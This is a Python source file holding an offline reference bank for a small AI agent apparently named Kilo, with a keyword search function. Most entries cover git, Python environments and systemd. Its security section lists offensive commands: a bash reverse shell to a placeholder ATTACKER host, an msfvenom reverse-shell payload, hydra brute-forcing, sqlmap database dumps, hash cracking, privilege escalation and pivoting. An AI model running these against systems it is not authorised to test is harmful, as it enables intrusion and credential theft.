"""A small, offline reference bank.

When Kilo has no internet, web_search/web_fetch cannot help, and a 1.5B model's memory of
exact command syntax is unreliable. This bundled, curated cheat-sheet gives it grounded
references for tool use, coding, systems and security work — looked up with the ``reference``
tool. It is deliberately light: concise, high-value entries, not an encyclopaedia.

Each entry has keywords (for matching), a one-line ``when`` (when it applies) and a terse
``use`` body. Add entries here; keep them short and correct.
"""

from __future__ import annotations

REFERENCE: list[dict[str, str]] = [
    # ---- recon / scanning -------------------------------------------------
    {"name": "nmap", "keywords": "nmap port scan recon service version enumerate ports",
     "when": "enumerate open ports and services on a host",
     "use": "nmap -sC -sV -p- -oN scan.txt TARGET   # all ports, default scripts, versions\n"
            "nmap -sU --top-ports 50 TARGET          # top UDP ports\n"
            "nmap -Pn TARGET                         # skip host discovery if ping blocked"},
    {"name": "masscan", "keywords": "masscan fast port scan large range",
     "when": "scan huge ranges fast, then nmap the hits",
     "use": "masscan -p1-65535 10.0.0.0/24 --rate 1000 -oL out.txt"},
    {"name": "gobuster/ffuf", "keywords": "gobuster ffuf dirbuster fuzz directory web content discovery vhost",
     "when": "discover web paths, files, or vhosts",
     "use": "ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302\n"
            "gobuster dir -u http://TARGET -w wordlist -x php,txt\n"
            "ffuf -u http://TARGET -H 'Host: FUZZ.target' -w subdomains.txt   # vhost"},
    {"name": "nikto/wpscan", "keywords": "nikto wpscan web vulnerability wordpress scanner",
     "when": "quick web server / WordPress vuln surface",
     "use": "nikto -h http://TARGET\nwpscan --url http://TARGET --enumerate u,vp"},
    # ---- exploitation -----------------------------------------------------
    {"name": "sqlmap", "keywords": "sqlmap sql injection database dump",
     "when": "test/exploit SQL injection",
     "use": "sqlmap -u 'http://TARGET/x?id=1' --batch --dbs\n"
            "sqlmap -r request.txt --batch --dump   # from a saved Burp request"},
    {"name": "searchsploit", "keywords": "searchsploit exploitdb find exploit cve",
     "when": "find a public exploit for a service/version",
     "use": "searchsploit apache 2.4.49\nsearchsploit -m 50383   # copy exploit locally"},
    {"name": "metasploit", "keywords": "metasploit msfconsole exploit payload meterpreter",
     "when": "use a known exploit/payload framework",
     "use": "msfconsole -q\nsearch type:exploit NAME\nuse <path>; set RHOSTS ip; set LHOST ip; run\n"
            "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=443 -f elf -o sh.elf"},
    {"name": "reverse shell", "keywords": "reverse shell netcat nc bash payload listener catch",
     "when": "catch or send a reverse shell",
     "use": "nc -lvnp 443                              # listener\n"
            "bash -i >& /dev/tcp/ATTACKER/443 0>&1     # bash reverse shell\n"
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'   # upgrade to a pty"},
    # ---- passwords / hashes ----------------------------------------------
    {"name": "hydra", "keywords": "hydra brute force login ssh ftp http password",
     "when": "brute-force a login service (authorised)",
     "use": "hydra -l user -P rockyou.txt ssh://TARGET\n"
            "hydra -L users -P pass http-post-form '/login:user=^USER^&pw=^PASS^:Invalid'"},
    {"name": "john/hashcat", "keywords": "john hashcat crack hash password wordlist",
     "when": "crack captured hashes",
     "use": "john --wordlist=rockyou.txt hashes.txt\n"
            "hashcat -m 0 -a 0 hashes.txt rockyou.txt   # -m 0 = MD5, 1000 = NTLM, 1800 = sha512crypt"},
    # ---- smb / windows / ad ----------------------------------------------
    {"name": "smb enum", "keywords": "smb enum4linux smbclient shares windows netbios",
     "when": "enumerate SMB shares and users",
     "use": "enum4linux -a TARGET\nsmbclient -L //TARGET -N\nsmbclient //TARGET/share -N"},
    # ---- privesc / pivot --------------------------------------------------
    {"name": "linux privesc", "keywords": "privilege escalation privesc linpeas sudo suid enumerate local",
     "when": "escalate privileges on a Linux host",
     "use": "sudo -l                       # allowed sudo\n"
            "find / -perm -4000 2>/dev/null # SUID binaries\n"
            "./linpeas.sh | tee out.txt    # automated enumeration (see GTFOBins for abuse)"},
    {"name": "pivoting", "keywords": "pivot tunnel chisel ligolo ssh port forward proxy",
     "when": "reach an internal network through a foothold",
     "use": "ssh -L 8080:127.0.0.1:80 user@host      # local forward\n"
            "ssh -D 1080 user@host                    # dynamic SOCKS proxy\n"
            "chisel server -p 8000 --reverse ; chisel client SRV:8000 R:socks"},
    # ---- coding -----------------------------------------------------------
    {"name": "python env", "keywords": "python venv pip virtualenv install package requirements",
     "when": "set up an isolated Python environment",
     "use": "python -m venv .venv && . .venv/bin/activate\npip install -r requirements.txt"},
    {"name": "git", "keywords": "git commit branch rebase diff stash reset coding version control",
     "when": "common git operations",
     "use": "git switch -c feature\ngit add -p && git commit\n"
            "git rebase -i HEAD~3      # squash/reword\ngit restore --staged FILE  # unstage"},
    {"name": "bash scripting", "keywords": "bash script shell loop condition set -e coding",
     "when": "write a safe bash script",
     "use": "set -euo pipefail\nfor f in *.txt; do echo \"$f\"; done\n"
            "if [[ -f x ]]; then ...; fi\ntrap 'echo err' ERR"},
    {"name": "curl", "keywords": "curl http request api json header post download",
     "when": "make HTTP requests from the shell",
     "use": "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' URL\n"
            "curl -fL URL -o file      # follow redirects, fail on error"},
    # ---- systems ----------------------------------------------------------
    {"name": "systemd", "keywords": "systemd systemctl service unit journalctl logs boot",
     "when": "manage services and read logs",
     "use": "systemctl status NAME\nsystemctl enable --now NAME\n"
            "journalctl -u NAME -n 100 --no-pager\njournalctl -f   # follow"},
    {"name": "network inspect", "keywords": "ss netstat network ports listening connections ip route",
     "when": "inspect local network state",
     "use": "ss -ltnp        # listening TCP + process\nip -br a\nip route"},
    {"name": "packages (arch)", "keywords": "pacman package install arch blackarch aur repository",
     "when": "install software on Arch (official only)",
     "use": "sudo pacman -S PACKAGE            # official repos\n"
            "sudo pacman -S blackarch-tools    # security tools via the BlackArch repo\n"
            "# Never use the AUR — official repos and BlackArch only."},
    # ---- method -----------------------------------------------------------
    {"name": "research method", "keywords": "research how to approach unknown learn method offline",
     "when": "you don't know how to do something",
     "use": "1) check this reference; 2) if online, web_search then web_fetch the primary source\n"
            "3) inspect the real system with tools before concluding; 4) verify, then save_skill."},
]


def search(query: str, limit: int = 4) -> list[dict[str, str]]:
    """Return the reference entries most relevant to the query (keyword overlap)."""
    terms = [t for t in query.lower().split() if len(t) > 2]
    scored: list[tuple[int, dict[str, str]]] = []
    for entry in REFERENCE:
        hay = (entry["name"] + " " + entry["keywords"] + " " + entry["when"]).lower()
        score = sum(1 for t in terms if t in hay)
        # a direct name hit is worth more
        if entry["name"].lower() in query.lower():
            score += 3
        if score:
            scored.append((score, entry))
    scored.sort(key=lambda s: s[0], reverse=True)
    return [e for _, e in scored[:limit]]
